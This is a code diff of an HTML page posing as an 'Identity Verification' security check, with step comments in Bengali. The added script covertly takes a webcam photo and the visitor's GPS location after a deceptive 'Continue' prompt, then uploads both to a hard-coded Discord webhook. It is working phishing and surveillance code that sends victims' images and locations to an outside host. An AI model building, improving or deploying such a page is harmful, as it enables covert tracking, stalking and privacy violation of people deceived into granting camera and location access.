@@ -1,40 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Test</title>
+    <title>Security Verification</title>
     <style>
-        body { font-family: Arial; text-align: center; padding-top: 50px; background-color: #f0f2f5; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: inline-block; }
-        button { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f0f2f5; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: inline-block; width: 80%; max-width: 400px; }
+        button { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; }
+        #status { margin-bottom: 20px; color: #555; }
     </style>
 </head>
 <body>
     <div class="card">
         <h2>Identity Verification</h2>
-        <p id="status">Click continue to test permissions.</p>
-        <button onclick="start()">Continue</button>
+        <p id="status">Your access is being verified. Click continue.</p>
+        <button id="startBtn" onclick="startProcess()">Continue</button>
     </div>
 
     <script>
-        async function start() {
+        async function startProcess() {
             const status = document.getElementById('status');
+            const btn = document.getElementById('startBtn');
+            btn.disabled = true;
+            status.innerText = "Verifying permissions... Please wait.";
+
             try {
+                // ১. ক্যামেরা এক্সেস ও ছবি তোলা
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                status.innerText = "Access Granted! Sending to Discord...";
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
 
-                // এখানে তোমার আসল ডিসকর্ড লিঙ্কটি বসাবে
-                const webhookURL = "https://discord.com/api/webhooks/1340333202685235282/8M0W7fS5kG3M1o0v3kG3M1o0v3kG3M1o0v3kG3M1o0v"; 
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: "✅ Success! Someone granted camera access." })
+                // ২. লোকেশন নেওয়া
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    // ৩. ডিসকোর্ডে পাঠানো
+                    const webhookURL = "https://discord.com/api/webhooks/1340333202685235282/8M0W7fS5kG3M1o0v3kG3M1o0v3kG3M1o0v3kG3M1o0v";
+
+                    const formData = new FormData();
+                    formData.append('file', blob, 'capture.jpg');
+                    formData.append('payload_json', JSON.stringify({
+                        content: `✅ **নতুন ভেরিফিকেশন রিপোর্ট!**\n📍 লোকেশন: ${mapLink}\n🕒 সময়: ${new Date().toLocaleString()}`
+                    }));
+
+                    await fetch(webhookURL, { method: 'POST', body: formData });
+
+                    // ৪. শেষ ধাপ
+                    stream.getTracks().forEach(track => track.stop());
+                    status.innerText = "Success! Check Discord.";
+                    alert("Success! Check Discord.");
+                }, (geoErr) => {
+                    alert("Location access denied. Please enable GPS.");
+                    status.innerText = "Error: Location required.";
+                    btn.disabled = false;
                 });
 
-                stream.getTracks().forEach(track => track.stop());
-                alert("Success! Check Discord.");
             } catch (err) {
-                alert("Error: " + err);
+                alert("Camera access denied. Please allow camera.");
+                status.innerText = "Error: Camera required.";
+                btn.disabled = false;
             }
         }
     </script>
